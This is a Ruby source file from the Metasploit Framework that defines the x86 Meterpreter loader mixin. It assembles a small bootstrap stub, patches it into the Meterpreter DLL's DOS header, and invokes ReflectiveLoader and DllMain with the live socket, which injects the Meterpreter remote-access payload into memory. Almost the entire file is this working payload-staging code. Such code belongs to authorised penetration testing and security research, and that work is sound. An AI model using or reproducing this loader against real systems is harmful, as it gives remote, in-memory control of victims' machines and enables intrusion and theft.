# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/reflective_dll_loader'

module Msf


###
#
# Common module stub for ARCH_X86 payloads that make use of Meterpreter.
#
###


module Payload::Windows::MeterpreterLoader

  include Msf::ReflectiveDLLLoader
  include Msf::Payload::Windows

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration RDI',
      'Description'   => 'Inject Meterpreter & the configuration stub via RDI',
      'Author'        => [ 'sf', 'OJ Reeves' ],
      'References'    => [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
        [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
      ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'PayloadCompat' => { 'Convention' => 'sockedi -https', },
      'Stage'         => { 'Payload'   => "" }
      ))
  end

  def asm_invoke_dll(opts={})
    asm = %Q^
        ; prologue
          dec ebp               ; 'M'
          pop edx               ; 'Z'
          call $+5              ; call next instruction
          pop ebx               ; get the current location (+7 bytes)
          push edx              ; restore edx
          inc ebp               ; restore ebp
          push ebp              ; save ebp for later
          mov ebp, esp          ; set up a new stack frame
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader() (0x????????)
          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
          call ebx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
          ; offset from ReflectiveLoader() to the end of the DLL
          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
          mov [ebx], edi        ; write the current socket to the config
          mov [ebx+4], esi      ; write the current listen socket to the config
          push ebx              ; push the pointer to the configuration start
          push 4                ; indicate that we have attached
          push eax              ; push some arbitrary value for hInstance
          mov ebx, eax          ; save DllMain for another call
          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
    ^
  end

  def stage_meterpreter
    # Exceptions will be thrown by the mixin if there are issues.
    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x86.dll'))

    asm_opts = {
      :rdi_offset => offset,
      :length     => dll.length
    }

    asm = asm_invoke_dll(asm_opts)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if( bootstrap.length > 62 )
      print_error( "Meterpreter loader (x86) generated an oversized bootstrap!" )
      return
    end

    # patch the bootstrap code into the dll's DOS header...
    dll[ 0, bootstrap.length ] = bootstrap

    dll
  end

end

end

